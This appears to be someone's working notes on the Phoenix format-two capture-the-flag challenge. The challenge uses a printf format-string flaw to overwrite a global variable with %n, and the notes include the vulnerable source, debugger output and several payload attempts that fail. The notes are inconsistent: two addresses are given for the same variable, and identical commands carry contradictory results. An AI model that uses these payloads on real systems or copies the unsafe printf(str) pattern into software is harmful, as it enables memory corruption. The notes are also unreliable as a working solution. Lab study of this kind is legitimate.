# Phoenix format-two
https://exploit.education/phoenix/format-two/
### Result
`Better luck next time!`
### Setup
```
docker start ctf
docker container exec -it ctf bash
```
### Compile code
This is a `format string` challenge using `printf`.  Unlike the **format_one** and **format_zero** challenges:
 - The value to overwrite is not a local variable on the `stack`.
 - Input is provided via `argv[1]`.

```
int changeme;               <-- defined at the "file" level so available inside main() and bounce()

void bounce(char *str) {
      printf(str);          <-- here is the issue!
}

int main(int argc, char **argv) {
  char buf[256];

```
### Writing over a non-stack integer variable with Format String Exploit
Both challenges so far had the `changeme` on the `stack`.  It was conveniently located next to the `destination buffer`.  Overflow the buffer and you would write over the `changeme` variable.

This wouldn't help in this challenge.

With a `Format String` How do you put the address of the `changeme` variable into `printf(str)`?  

Parameter  | Meaning  | Passed as
--|---|--
%d   | decimal (int)  |  value
%u   | unsigned decimal (unsigned int)  |  value
%x| hexadecimal (unsigned int)  |  value
%n| number of bytes written so far (*int) |  reference
%hn| number of bytes written so far (*short) |  reference  
%s | string ((const) (unsigned) char*)  |  reference

##### The %n Parameter
With the  `%n parameter` we can write an integer to nearly any location in the process memory.  Excellent references:
http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf
https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
https://blog.lamarranet.com/index.php/exploit-education-phoenix-format-two-solution/.


Example code below:

```
int main() {
    int medium_num;
    short tiny_num;
    printf("AAAAAAAAA%n", &medium_num);    // copies 0x9 into the memory address of 'medium_num'
    printf("BBBB%hn", &tiny_num);          // copies 0x4 into the memory address of 'tiny_num'
    return 0;
}
```
### Finding the changeme variable
##### On a debug build
```
gef➤  print &changeme
$1 = (int *) 0x601050 <changeme>
```
##### Get address
`objdump -t format_two | grep changeme`
##### Read address
`0000000000601054 g     O .bss	0000000000000004              changeme`
##### Read sections of binary
This shows the start and end of `bss` memory. `bss` is uninitialized data `"Block Started by Symbol"`.  It also shows `changeme` is `allocated` and not `read-only`.

If we change `changeme` to a non-null value, it moves to the `data` section of the binary.

##### Disassemble main() in gdb
You can see `changeme` is tested here:
```
0x4006a1 <main+122>       mov    eax, DWORD PTR [rip+0x2009ad]        # 0x601054 <changeme>
0x4006a7 <main+128>       test   eax, eax
0x4006a9 <main+130>       je     0x4006b9 <main+146>
0x4006ab <main+132>       lea    rdi, [rip+0xde]        # 0x400790
```
If you break on `main+128` it is comparing `0` with `0` and then jumps to `Better luck next time!`.

### Inspecting the code
This challenge uses more C APIs than previous `format string` challenges.
```
radare2 -A format_two

[0x00400520]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004004d0 GLOBAL FUNC       strncpy
2   0x004004e0 GLOBAL FUNC       puts
3   0x004004f0 GLOBAL FUNC       printf
4   0x00400500 GLOBAL FUNC       memset
7   0x00400510 GLOBAL FUNC       exit
```



### Find printf starting argument
The `format string` is also placed on the `stack`.  Visually I liked the following diagram:

Top of stack | | printf pointer    |   |   | <-- grows  |  Bottom of stack
--|---|---|---|---|---|--
  | Return Addr  | Addr of format string   | var one  | var two  |   |  

#####  Find address of first printf argument
With brute force you can find the first argument passed to `printf`. Keep sending in "AAAA" and adding another `%08x` until you hit the number.  

##### Result
You find the first argument the entered "AAAA" as `41414141` after 12 x `%08x`:

`AAAA0000000b.00000000.ffffe510.00000000.3830252e.00000000.ffffe410.ffffe510.004006a1.ffffe5f8.ffffe550.41414141.Better luck next time!`
#####  Finding printf's first argument
`run $(python -c 'print "AAAA" + "%08x." * 12')`
#####  Finding printf's first argument ( alternative )
`run "AAAA %p %p %p %p %p %p %p %p %p %p %p %p"`

### Payloads
Different to the first two format string challenges, you pass in the payload as `argv[1]`:
##### Blind shot
```
run $(python -c 'print "%268x" + "\x41\x41\x41\x41"')
Better luck next time!
```
We could inject `format arguments` to try and take the `buffer` beyond `256` characters, using our user input ( which routes the input via `strncpy` ).  But would that really help if the `changeme` address is not on the `stack`?  No.

##### Re-order changeme address for little endian order
```
# Python 3
>>> s="601054"
>>> "".join(map(str.__add__, s[-2::-2] ,s[-1::-2]))
541060
```
##### re-order Payload at run time
`python -c 'print "\x54\x10\x60\x00"[::-1]' > test.hex`

### Bugs
##### The null byte issue
`\x00`

##### Bugs: in memory
`strncpy` is skipping the `null byte`.  The last Null byte was removed:
 - Payload sent:`"\x54\x10\x60\x00'`
 - `strncpy` turned it into `"\x54\x10\x60"`

```
gef➤  x/272bx 0x00007fffffffe350
0x7fffffffe350:	'A' <repeats 252 times>, "T\020`%\340\006@"

0x7fffffffe440:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0x7fffffffe448:	----- issue     ----->	0x54	0x10	0x60	0x??  
```
### Refined Payloads
##### Try with %n payload
`run $(echo -e "\x54\x10\x60%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n")`
##### Get sizeof int type
`p/d sizeof(int)`     # 4
##### Breakpoint on if (changeme != 0)
`x/4bx 0x601054`
##### If debug symbols available
` print &changeme`
##### Result - failed
`0x601054 <changeme>:	0x00	0x00	0x00	0x00`

##### A good Segmentation Fault
`"AAAA %p %p %p %p %p %p %p %p %p %p %p %n"`
##### Bad news - a Segmentation Fault
##### Null byte

##### Reverse byte order
```# ./format_two `python -c 'print "\x60\x10\x50"[::-1] + "%p"*11 + "%n"'
```
##### Reverse byte order
# ./format_two `python -c 'print "\x54\x10\x60\x00" + "%p"*11 + "%n"'`
bash: warning: command substitution: ignored null byte in input
Welcome to brought to you by https://exploit.education
Segmentation fault
```
##### Backtrace
```
backtrace
#0  in _IO_vfprintf_internal "h\230\004\b%p%p%p%p%p%p%p%p%p%p%p%n" at vfprintf.c:1642
#3  in main (argc=0x2, argv=0x7fffffffe618) at format_two.c:23
```
##### A good Segmentation Fault
```
run $(echo -e "\x54\x10\x60 %p %p %p %p %p %p %p %p %p %p %p %n")
Starting program: /root/format_two $(echo -e "\x54\x10\x60 %p %p %p %p %p %p %p %p %p %p %p %n")
-eBetter luck next time!
```
##### changeme untouched
```
b *main+128
Breakpoint 1 at 0x4006a7: file format_two.c, line 26.

< run until breakpoint >

gef➤  x/4bx 0x601054
0x601054 <changeme>:	0x00	0x00	0x00	0x00
```

```
run $(echo -e "%p %p %p %p %p %p %p %p %p %p %p %n\x60\x10\x50")
```


##### Seg fault
`gef➤  r '%p%p%p%p%p%p%p%p%p%n\x50\x10\x60\x00`
##### NO seg fault
`gef➤  r '%p%p%p%p%p%p%p%p%p%n\x50\x10\x60\x00`
### Source code
```
 /*
 * Can you change the "changeme" variable?
 */

 #include <err.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>

 #define BANNER \
   "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

 int changeme;

 void bounce(char *str) {
   printf(str);
 }

 int main(int argc, char **argv) {
   char buf[256];

   printf("%s\n", BANNER);

   if (argc > 1) {
     memset(buf, 0, sizeof(buf));
     strncpy(buf, argv[1], sizeof(buf));
     bounce(buf);
   }

   if (changeme != 0) {
     puts("Well done, the 'changeme' variable has been changed correctly!");
   } else {
     puts("Better luck next time!\n");
   }

   exit(0);
 }
```
